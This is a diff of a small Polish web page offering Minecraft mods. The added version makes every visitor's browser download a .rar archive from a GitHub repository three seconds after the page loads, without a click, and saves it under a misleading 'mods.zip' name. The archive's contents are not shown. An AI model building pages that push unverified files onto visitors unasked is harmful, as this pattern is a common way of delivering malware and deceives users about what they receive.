@@ -1,147 +1,119 @@
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-  <meta charset="UTF-8" />
-  <title>Masz Grzyba</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@700&display=swap');
-
-    body {
-      font-family: 'Montserrat', sans-serif;
-      text-align: center;
-      padding: 50px 20px;
-      user-select: none;
-      transition: background 0.6s ease, color 0.6s ease;
-    }
-
-    body.light {
-      background: linear-gradient(135deg, #0f0f0f, #004400);
-      color: #d0f0c0;
-    }
-
-    body.dark {
-      background: #111;
-      color: #eee;
-    }
-
-    h1 {
-      font-size: 3.5rem;
-      margin-bottom: 25px;
-      animation: glow 3s ease-in-out infinite;
-      cursor: default;
-    }
-
-    @keyframes glow {
-      0%, 100% { text-shadow: 0 0 8px #a0ff80, 0 0 20px #70ff40; }
-      50% { text-shadow: 0 0 20px #d0ffb0, 0 0 30px #90ff50; }
-    }
-
-    img {
-      max-width: 90%;
-      height: auto;
-      border-radius: 25px;
-      border: 5px solid #5cbb5c;
-      cursor: pointer;
-      animation: float 6s ease-in-out infinite;
-      transition: transform 0.25s ease, border-color 0.3s ease;
-      box-shadow: 0 0 25px #7fff7f88;
-    }
-
-    img:hover {
-      transform: scale(1.1) rotate(2deg);
-      border-color: #b0ffb0;
-      box-shadow: 0 0 40px #b0ffb0;
-    }
-
-    @keyframes float {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-15px); }
-    }
-
-    p.info {
-      font-size: 1.2rem;
-      margin: 15px 0 40px 0;
-      opacity: 0.85;
-      font-weight: 600;
-    }
-
-    button {
-      background: #7fff7f;
-      border: none;
-      border-radius: 30px;
-      padding: 15px 40px;
-      font-size: 1.2rem;
-      font-weight: 700;
-      color: #004400;
-      box-shadow: 0 5px 15px #55bb55aa;
-      cursor: pointer;
-      transition: background 0.3s ease, transform 0.15s ease;
-      user-select: none;
-      margin: 10px;
-    }
-
-    button:hover {
-      background: #aaffaa;
-      transform: scale(1.1);
-      box-shadow: 0 7px 20px #66cc6688;
-    }
-
-    button:active {
-      transform: scale(0.95);
-      box-shadow: 0 3px 10px #44aa4488;
-    }
-
-    @media (max-width: 480px) {
-      h1 {
-        font-size: 2.5rem;
-      }
-      button {
-        padding: 12px 30px;
-        font-size: 1rem;
-      }
-    }
-  </style>
+<meta charset="UTF-8" />
+<title>Masz Grzyba - Instalacja Modów</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@700&display=swap');
+  body {
+    margin: 0; padding: 0;
+    background: linear-gradient(135deg, #0b2e0f, #2f7a22);
+    color: #cdeac0;
+    font-family: 'Montserrat', sans-serif;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    user-select: none;
+  }
+  h1 {
+    font-size: 3rem;
+    text-shadow: 0 0 8px #97e56d, 0 0 20px #6dce3c;
+    margin-bottom: 10px;
+  }
+  p {
+    font-size: 1.2rem;
+    margin: 10px 0 40px 0;
+    text-align: center;
+    max-width: 400px;
+    text-shadow: 0 0 6px #6dce3c;
+  }
+  .grzyb-svg {
+    width: 180px;
+    height: 180px;
+    margin-bottom: 30px;
+    animation: pulse 3s infinite;
+    filter: drop-shadow(0 0 8px #8ce465);
+  }
+  @keyframes pulse {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.1); }
+  }
+  .loader {
+    width: 60px;
+    height: 60px;
+    border: 6px solid #6dce3c;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-bottom: 30px;
+  }
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+  button {
+    background: #9cdc72;
+    color: #134200;
+    border: none;
+    padding: 15px 40px;
+    font-weight: 700;
+    font-size: 1.1rem;
+    border-radius: 35px;
+    cursor: pointer;
+    box-shadow: 0 5px 15px #74b044bb;
+    transition: background-color 0.3s ease, transform 0.2s ease;
+    user-select: none;
+  }
+  button:hover {
+    background-color: #b4e574;
+    transform: scale(1.1);
+  }
+  button:active {
+    transform: scale(0.95);
+  }
+</style>
 </head>
-<body class="light">
-  <h1 id="title">Masz Grzyba 🍄</h1>
-  <a href="https://www.youtube.com/" target="_blank" rel="noopener noreferrer" title="Kliknij i leć na YouTube!">
-    <img src="grzyb.png" alt="Masz grzyba" />
-  </a>
-  <p class="info">Kliknij obrazek, żeby przejść na YouTube i znaleźć więcej grzybowych rzeczy.</p>
-  
-  <button id="toggleTheme">Tryb ciemny</button>
-  <button id="downloadMods">Pobierz mody do MC</button>
+<body>
+
+  <svg class="grzyb-svg" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <circle cx="32" cy="32" r="30" fill="#71A354"/>
+    <circle cx="32" cy="22" r="14" fill="#CE3737"/>
+    <circle cx="24" cy="18" r="3" fill="#fff"/>
+    <circle cx="38" cy="18" r="3" fill="#fff"/>
+    <circle cx="32" cy="32" r="6" fill="#fff"/>
+  </svg>
+
+  <h1>Masz Grzyba 🍄</h1>
+  <p>Twoje mody do Minecrafta są właśnie pobierane!<br />Za chwilę znajdziesz je w folderze pobranych plików.</p>
+
+  <div class="loader"></div>
+
+  <button id="downloadBtn">Pobierz ręcznie, jeśli nie zaczął się download</button>
 
   <script>
-    // zmiana emoji w tytule
-    const title = document.getElementById('title');
-    const emojis = ['🍄', '🍁', '🌿', '🍃', '🌱', '🍂'];
-    let emojiIndex = 0;
+    const zipUrl = 'https://github.com/TVRXD/TVRX/raw/refs/heads/main/mods.rar'; // <- zmień na swój link do ZIP
 
-    setInterval(() => {
-      emojiIndex = (emojiIndex + 1) % emojis.length;
-      title.textContent = `Masz Grzyba ${emojis[emojiIndex]}`;
-    }, 2500);
+    // Automatyczne pobieranie po 3 sekundach
+    setTimeout(() => {
+      const a = document.createElement('a');
+      a.href = zipUrl;
+      a.download = 'mods.zip';
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+    }, 3000);
 
-    // tryb jasny/ciemny
-    const btnTheme = document.getElementById('toggleTheme');
-    btnTheme.addEventListener('click', () => {
-      if (document.body.classList.contains('light')) {
-        document.body.classList.replace('light', 'dark');
-        btnTheme.textContent = 'Tryb jasny';
-      } else {
-        document.body.classList.replace('dark', 'light');
-        btnTheme.textContent = 'Tryb ciemny';
-      }
-    });
-
-    // pobieranie modów
-    const btnDownload = document.getElementById('downloadMods');
-    btnDownload.addEventListener('click', () => {
-      // zmień ten link na swój ZIP z modami w repozytorium GitHub
-      const zipUrl = 'https://github.com/TVRXD/TVRX/blob/main/mods.rar';
-      window.open(zipUrl, '_blank');
+    // Ręczny przycisk pobierania
+    document.getElementById('downloadBtn').addEventListener('click', () => {
+      const a = document.createElement('a');
+      a.href = zipUrl;
+      a.download = 'mods.zip';
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
     });
   </script>
+
 </body>
 </html>
